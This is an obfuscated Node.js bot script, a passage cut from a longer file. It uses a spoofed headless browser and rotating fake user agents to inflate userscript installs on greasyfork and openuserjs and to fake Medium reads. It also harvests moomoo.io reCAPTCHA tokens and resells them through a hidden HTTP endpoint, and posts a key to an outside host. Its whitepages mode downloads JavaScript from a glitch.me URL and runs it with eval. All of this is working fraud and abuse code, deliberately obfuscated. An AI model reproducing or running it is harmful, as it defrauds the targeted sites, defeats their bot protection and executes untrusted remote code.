      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + W(0x7, 'fvs2') + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + W(0x6, '!&Az') + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + U(0x1c) + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + U(0x19) + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + U(0x9) + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x3ca + -0xf05 + 0xb3b
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x18f9 + 0x18e8 + -0x31e1)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x155b + -0x5 * -0x491 + 0x2 * -0x8b), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x2 * -0x3e5 + -0x75c + 0x2 * -0x5), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const X = b,
          r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x1ba5 + 0xd54 + -0x28f9 * 0x1;
          if (await u['goto'](miscSites2[X(0x2, 'rONc')](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x1d1e * 0x1 + 0x1f00 + -0x3c1e; w < getRandomInt(0x2 * -0xe67 + -0x1 * -0x55b + 0x1774, -0x15ae + -0x3c4 * 0x7 + -0x300f * -0x1); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x11aef * -0x1 + 0x9 * -0x2695 + -0x9557 * -0x2);
        }
      }();
    }, -0x50e + 0x2cb * -0x4 + 0x84f * 0x2), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x2 * -0x378 + 0x81d * 0x2 + -0x4a2 * 0x5;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x2469 * -0x1 + -0xa * -0xfb + 0x1a9b, 0x1ce4 + 0x1 * 0x150a + 0x31bc * -0x1)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0xdda + 0x2243 + 0x4513);
    }, -0x2ab * -0xa + -0x5 * -0x5c + 0xa * -0x2cf), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x1221 * -0x2 + -0x213 * 0x1 + -0x222f;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x1 * 0xe3e + -0x2b * -0xc1 + -0x1 * 0x675), await u['evaluate'](() => {
            const Y = c;
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0xb * 0x5d + -0x211b + 0x128d * 0x2), v['send'](), eval(v[Y(0xa) + 'xt']);
          }), await wait(-0xb * -0x18f02 + -0x75c4a + -0x3f2d4 * -0x1);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x236 + -0x1978 + 0xbd3 * 0x2);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x2324 + -0x2499 + 0x23d);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x3b6 * 0x11 + 0xccc + 0x1 * -0x2c52);
}
doFlags['doOUJS'] && ((async () => {
  const a2 = b,
    a1 = d,
    a0 = c;
  async function f() {
    const Z = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x18de + -0x8e7 + 0x3 * 0xb42) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0xe5c * -0x1 + -0x1811 + 0x1337 * 0x2));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0xa4b + -0xd18 + -0xef * -0x3, D['indexOf']('\x20'));
        return B ? E['slice'](-0x7 * 0x2b + 0x1c4d + -0x1b20, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x3d37 + 0xf * -0x277 + 0xed2),
        'headers': {
          'host': 'openuserjs' + Z(0x10, 'z)77'),
          'origin': Z(0x1a, 'iuMU') + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x1 * 0x171d + 0xd13 + -0x5c * -0x8),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + a0(0x18) + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + a1(0x11) + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + a1(0x11) + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      a1(0x1f) + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + a2(0x21, '!&Az') + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
